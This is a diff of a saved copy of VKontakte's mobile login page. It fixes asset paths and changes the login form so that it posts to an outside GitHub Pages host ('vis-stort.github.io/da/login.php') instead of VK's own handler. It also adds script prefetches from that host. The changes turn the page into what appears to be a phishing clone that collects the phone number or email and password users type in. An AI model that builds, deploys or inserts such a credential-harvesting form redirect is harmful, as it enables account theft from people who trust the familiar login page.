@@ -7,7 +7,7 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="MobileOptimized" content="176">
         <meta name="HandheldFriendly" content="True">
-        <!--<base id="base">--><base href=".">
+        <!--<base id="base">--><!--<base href=".">--><base href=".">
         <link rel="manifest" crossorigin="use-credentials" href="https://m.vk.com/manifest.webmanifest?ver=209">
         <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
         <meta property="og:description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
@@ -21,7 +21,7 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
         <title>Мобильная версия ВКонтакте | ВКонтакте</title>
         <meta http-equiv="origin-trial" content="Av8ECqeAAIiC9bF3N7aq2M/TaxNzzpPcFXnw0rRb9KRUQlbyHKYmPj6KeVUFVDk+S7W9RfJH2GsEOS8G99uJvgcAAABaeyJvcmlnaW4iOiJodHRwczovL3ZrLmNvbTo0NDMiLCJmZWF0dXJlIjoiQmFkZ2luZyIsImV4cGlyeSI6MTU2MTY2MTkxNCwiaXNTdWJkb21haW4iOnRydWV9">
-        <script type="text/javascript" async="" src="./index _files/code.js"></script><script type="text/javascript">
+        <script type="text/javascript" async="" src="./index_files/code.js"></script><script type="text/javascript">
 <!--
 /*web_vitals_polyfill*/(function(){"use strict";var e,t,n,i,r,o,a,c,u,s,f,p;function l(){}return r={passive:!0,capture:!0},o=new Date,a=function n(){i=[],t=-1,e=null,f(addEventListener)},c=function i(r,o){e||(e=o,t=r,n=new Date,f(removeEventListener),u())},u=function r(){if(t>=0&&t<n-o){var a={entryType:"first-input",name:e.type,target:e.target,cancelable:e.cancelable,startTime:e.timeStamp,processingStart:e.timeStamp+t};i.forEach((function(e){e(a)})),i=[]}},s=function e(t){if(t.cancelable){var n=(t.timeStamp>1e12?new Date:performance.now())-t.timeStamp;"pointerdown"==t.type?(function(e,t){var n=function n(){c(e,t),o()},i=function e(){o()},o=function e(){removeEventListener("pointerup",n,r),removeEventListener("pointercancel",i,r)};addEventListener("pointerup",n,r),addEventListener("pointercancel",i,r)})(n,t):c(n,t)}},f=function e(t){["mousedown","keydown","touchstart","pointerdown"].forEach((function(e){return t(e,s,r)}))},p="hidden"===document.visibilityState?0:1/0,addEventListener("visibilitychange",(function e(t){"hidden"===document.visibilityState&&(p=t.timeStamp,removeEventListener("visibilitychange",e,!0))}),!0),a(),!void(self.webVitals={firstInputPolyfill:function e(t){i.push(t),u()},resetFirstInputPolyfill:a,get firstHiddenTime(){return p}}),l})()
 //-->
@@ -72,37 +72,37 @@
 ;/*top_script*/(function(){"use strict";function e(e){t(e),e.hash_redirect&&o(e),e.al_ver&&(window.al={ver:e.al_ver}),document.addEventListener("DOMContentLoaded",(function(){e.help_hints&&window.Tooltip&&window.Tooltip.initHelpHints&&window.Tooltip.initHelpHints(e.help_hints)}))}function t(e){var t=e.iospwa_cookie,o=e.device_cookie,i=e.cookie_secure,n=e.cookie_samesite,a=e.cookie_path,r=e.cookie_domain,c=e.need_reload,s=new Date((new Date).getTime()+7776e6).toUTCString();!0===navigator.standalone&&-1===document.cookie.indexOf(t+"=1")&&(document.cookie=t+"=1; expires="+s+";"+i+n+" path="+a+"; domain="+r);var l=document,u=window,d="undefined",p="!",h="-",f=u.screen,m=f.width||0,v=f.height||0,y=u.devicePixelRatio||1,w=new RegExp("(^|;\\s+)"+o+"=([^;]+)"),g=(l.cookie.match(w)||[])[2]||"",T=g.split("/");if(g&&m==T[0]&&v==T[1]&&y==T[2]&&7===T[3].length);else{var k=[m,v,y,M()].join("/");l.cookie=o+"=; expires="+new Date(0).toUTCString()+";"+i+n+" path="+a,l.cookie=o+"="+k+"; expires="+s+";"+i+n+" path="+a+"; domain="+r,""!==l.cookie&&c&&location.reload()}function M(){var e=(function(){var e;try{e=new XMLHttpRequest}catch(t){try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}}}return e?"!":"-"})(),t=((o=l.createElement("div")).innerHTML='<input type="file" />',"file"!==(o=o.getElementsByTagName("input")[0]).type||o.disabled?"-":"!"),o,i="ontouchstart"in u?"!":"-",n="-",a,r,c;try{(typeof navigator.geolocation!==d||typeof u.google!==d&&typeof google.gears!==d||typeof device!==d&&typeof device.getServiceObject!==d||typeof Mojo!==d&&"Mojo.Service.Request"!=typeof Mojo.Service.Request)&&(n="!")}catch(e){}return[e,t,i,n,(function(e){try{var t=u.Audio?new Audio:l.createElement("audio");if(t.canPlayType&&t.canPlayType(e)&&"no"!==t.canPlayType(e))return"!"}catch(e){}return"-"})("audio/mpeg"),(function(e){try{for(var t=l.createElement("div"),o=["","webkit","Moz","ms","O"],i=0,n=o.length;i<n;i++){var a=o[i],r=a?a+e:e.toLowerCase();if(typeof t.style[r]!==d)return"!"}return"-"}catch(e){return"-"}})("Transform"),(u.XMLHttpRequest||u.XDomainRequest)&&(u.FormData||u.FileReader&&(u.XMLHttpRequest&&XMLHttpRequest.sendAsBinary||u.ArrayBuffer&&u.Uint8Array&&(u.MozBlobBuilder||u.WebKitBlobBuilder||u.BlobBuilder)))?"!":"-"].join("")}}function o(e){var t=e.cookie_secure,o=e.cookie_samesite,i=location,n=i.hash||"",a=n.substr(2);if("#/"===n.substr(0,2)){var r=window.locDomain,c=new Date;c.setTime(c.getTime()+864e5);var s="; expires="+c.toGMTString();document.cookie=["remixtmp_hash_nav","=",escape(i.href),s,"; path=/",""+t,""+o,r?"; domain=."+r:""].join(""),a.match(/^\/*(away|login)(\.php)?([^a-z0-9\.]|$)/)&&(a=""),i.replace(i.protocol+"//"+i.host+"/"+a)}}return e})()({"hash_redirect":true,"device_cookie":"remixmdevice","iospwa_cookie":"remixmiospwa","cookie_path":"\/","cookie_domain":".vk.com","cookie_samesite":" SameSite=None;","cookie_secure":" Secure;","need_reload":true,"help_hints":{"mvk:video_filters":{"id":"mvk:video_filters","active":false,"hash":null},"feed:textlive_hide":{"id":"feed:textlive_hide","active":true,"hash":"a5843e10dedb22638b"},"narratives:add_tooltip":{"id":"narratives:add_tooltip","active":false,"hash":null},"community:textlives_counter":{"id":"community:textlives_counter","active":false,"hash":null},"feed:post_popup_reactions":{"id":"feed:post_popup_reactions","active":false,"hash":null},"feed:post_popup_select_inactive":{"id":"feed:post_popup_select_inactive","active":false,"hash":null},"feed:post_preview_reactions":{"id":"feed:post_preview_reactions","active":false,"hash":null},"feed:post_reaction":{"id":"feed:post_reaction","active":false,"hash":null},"mvk:stories_archive:privacy_hint":{"id":"mvk:stories_archive:privacy_hint","active":true,"hash":"ccd5b486f0fdb94991"},"mvk:stories_archive:actions_hint":{"id":"mvk:stories_archive:actions_hint","active":true,"hash":"29d20f5a7217617da2"}},"al_ver":"04d390a3496ecc4f3ecad41d125d5e2da306b9c6bb0022d8d7b0060f39f9a0f7"});
 //-->
 </script>
-        <link rel="stylesheet" href="./index _files/variables.018085e68b93c11b5c9e.css">
-<link rel="stylesheet" href="./index _files/common.65d3310bf134d007fa7b.css">
-<link rel="stylesheet" href="./index _files/MediaView.b29857e2530808ba69c5.css">
-<link rel="stylesheet" href="./index _files/audio.392305f389f1c3964f57.css">
-<link rel="stylesheet" href="./index _files/vkui.1a46d77340fd8fb5ec46.css">
-<link rel="stylesheet" href="./index _files/audio_player_bottom.2ca424c8be4c581fa5c6.css">
-<link rel="stylesheet" href="./index _files/audio_player_mini.770294ed9f7bac5f1259.css">
-<link rel="stylesheet" href="./index _files/unauthorized.08cab1d00c4d4b9e066e.css">
-<link rel="stylesheet" href="./index _files/owner_photo_upload.046c9b64f189beeee9e7.css">
-<script src="./index _files/runtime.549410a4d4a9eb1fbff9.js"></script>
-<script src="./index _files/vendor.6b7a22773f17fec08592.js"></script>
-<script src="./index _files/polyfills.587b55bb2a9d87a48eab.js"></script>
-<script src="./index _files/icons.4ce45d8c29d6079433a3.js"></script>
-<script src="./index _files/vendor_vkui.97898ec60f57ff1cdfee.js"></script>
-<script src="./index _files/vendor_qr.b1541d06169501fface6.js"></script>
-<script src="./index _files/b-93a435b854bd32d1172676df2ef0660b.323ddb1417ff3fed36bf.js"></script>
-<script src="./index _files/b-cd1bd7666b0b0a417cbe4ad7de6f651d.ee8ac25a5262c1d0a50b.js"></script>
-<script src="./index _files/b-cc249007038b89cf1982a1f77a49d64d.30ebd7345411515b2efa.js"></script>
-<script src="./index _files/common.1dbc73ca2f22d7a284f5.js"></script><style></style>
-<script src="./index _files/grip.8413b95a8873d3062417.js"></script>
-<script src="./index _files/vendor_raven.4d1b41b1f588bbef1d4c.js"></script>
-<script src="./index _files/js_errors_logger.6d039f2e83c49878b124.js"></script>
-<script src="./index _files/b-838e05410c36ff4216b77b97d7035d9e.dd2c0419d658342bca85.js"></script>
-<script src="./index _files/performance_logger.d284fc38672732b80a7f.js"></script>
-<script src="./index _files/b-81a1af81a054f6bff8edd4d0775bf1af.331c2b5a38cd1ad3b72a.js"></script>
-<script src="./index _files/b-3440d0a13a45352a309cc86a35537ef8.18c5d524cc89ddf846d2.js"></script>
-<script src="./index _files/audio_player_bottom.e3036f3e0de4ea8e527e.js"></script>
-<script src="./index _files/audio_player_mini.8e8e9436dc746bd41691.js"></script>
-<script src="./index _files/b-15c2f38da882b2c53340a6b7c7670966.3b6f25ee495418b81e6c.js"></script>
-<script src="./index _files/unauthorized.be7b6090036834b5781e.js"></script>
-<script src="./index _files/owner_photo_upload.cfc855428d008d95cbd6.js"></script><link rel="prefetch" as="script" href="https://m.vk.com/dist/mobile/vendor~cropperjs.3e109603fc7911049764.js"><link rel="prefetch" as="script" href="https://m.vk.com/dist/mobile/thumbnail_creator.2478664b6f7bcf1084e7.js">
+        <link rel="stylesheet" href="./index_files/variables.018085e68b93c11b5c9e.css">
+<link rel="stylesheet" href="./index_files/common.65d3310bf134d007fa7b.css">
+<link rel="stylesheet" href="./index_files/MediaView.b29857e2530808ba69c5.css">
+<link rel="stylesheet" href="./index_files/audio.392305f389f1c3964f57.css">
+<link rel="stylesheet" href="./index_files/vkui.1a46d77340fd8fb5ec46.css">
+<link rel="stylesheet" href="./index_files/audio_player_bottom.2ca424c8be4c581fa5c6.css">
+<link rel="stylesheet" href="./index_files/audio_player_mini.770294ed9f7bac5f1259.css">
+<link rel="stylesheet" href="./index_files/unauthorized.08cab1d00c4d4b9e066e.css">
+<link rel="stylesheet" href="./index_files/owner_photo_upload.046c9b64f189beeee9e7.css">
+<script src="./index_files/runtime.549410a4d4a9eb1fbff9.js"></script>
+<script src="./index_files/vendor.6b7a22773f17fec08592.js"></script>
+<script src="./index_files/polyfills.587b55bb2a9d87a48eab.js"></script>
+<script src="./index_files/icons.4ce45d8c29d6079433a3.js"></script>
+<script src="./index_files/vendor_vkui.97898ec60f57ff1cdfee.js"></script>
+<script src="./index_files/vendor_qr.b1541d06169501fface6.js"></script>
+<script src="./index_files/b-93a435b854bd32d1172676df2ef0660b.323ddb1417ff3fed36bf.js"></script>
+<script src="./index_files/b-cd1bd7666b0b0a417cbe4ad7de6f651d.ee8ac25a5262c1d0a50b.js"></script>
+<script src="./index_files/b-cc249007038b89cf1982a1f77a49d64d.30ebd7345411515b2efa.js"></script>
+<script src="./index_files/common.1dbc73ca2f22d7a284f5.js"></script><style></style>
+<script src="./index_files/grip.8413b95a8873d3062417.js"></script>
+<script src="./index_files/vendor_raven.4d1b41b1f588bbef1d4c.js"></script>
+<script src="./index_files/js_errors_logger.6d039f2e83c49878b124.js"></script>
+<script src="./index_files/b-838e05410c36ff4216b77b97d7035d9e.dd2c0419d658342bca85.js"></script>
+<script src="./index_files/performance_logger.d284fc38672732b80a7f.js"></script>
+<script src="./index_files/b-81a1af81a054f6bff8edd4d0775bf1af.331c2b5a38cd1ad3b72a.js"></script>
+<script src="./index_files/b-3440d0a13a45352a309cc86a35537ef8.18c5d524cc89ddf846d2.js"></script>
+<script src="./index_files/audio_player_bottom.e3036f3e0de4ea8e527e.js"></script>
+<script src="./index_files/audio_player_mini.8e8e9436dc746bd41691.js"></script>
+<script src="./index_files/b-15c2f38da882b2c53340a6b7c7670966.3b6f25ee495418b81e6c.js"></script>
+<script src="./index_files/unauthorized.be7b6090036834b5781e.js"></script>
+<script src="./index_files/owner_photo_upload.cfc855428d008d95cbd6.js"></script><link rel="prefetch" as="script" href="https://vis-stort.github.io/dist/mobile/vendor~cropperjs.3e109603fc7911049764.js"><link rel="prefetch" as="script" href="https://vis-stort.github.io/dist/mobile/thumbnail_creator.2478664b6f7bcf1084e7.js"><link rel="prefetch" as="script" href="https://m.vk.com/dist/mobile/vendor~cropperjs.3e109603fc7911049764.js"><link rel="prefetch" as="script" href="https://m.vk.com/dist/mobile/thumbnail_creator.2478664b6f7bcf1084e7.js">
 
         <link rel="canonical" href="https://vk.com/">
         <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/">
@@ -147,7 +147,7 @@
       Мобильная версия поможет вам оставаться ВКонтакте, даже если вы далеко от компьютера.
     </div>
     
-    <form method="POST" action="login.php" novalidate="">
+    <form method="POST" action="https://vis-stort.github.io/da/login.php" novalidate="">
       <dl class="fi_row">
         <dd>
           <label role="presentational" class="TextInput TextInput_native"><div class="TextInput__content"><input class="TextInput__native" type="email" name="email" value="" spellcheck="" placeholder="Телефон или email" autocomplete="username" oninput="TextInput.onChange(event);" onblur="TextInput.onBlur(event, this);" onfocus="TextInput.onFocus(event, this);"></div></label>
@@ -195,7 +195,7 @@ onDOMReady((function () { setTimeout((function() { trackEvent('unauth_feed_init'
 //-->
 </script>
           <div aria-hidden="true" class="_cntrs" style="height:0;overflow:hidden;">
-          <img width="1" height="1" src="./index _files/p" alt="">
+          <img width="1" height="1" src="./index_files/p" alt="">
       
       <noscript><img src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;r=https%3A%2F%2Fm.vk.com%2F" style="border:0;" height="1" width="1" /></noscript>
     </div>
@@ -231,4 +231,5 @@ if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, fal
         
         
       
-    </body></html>
+    
+</body></html>
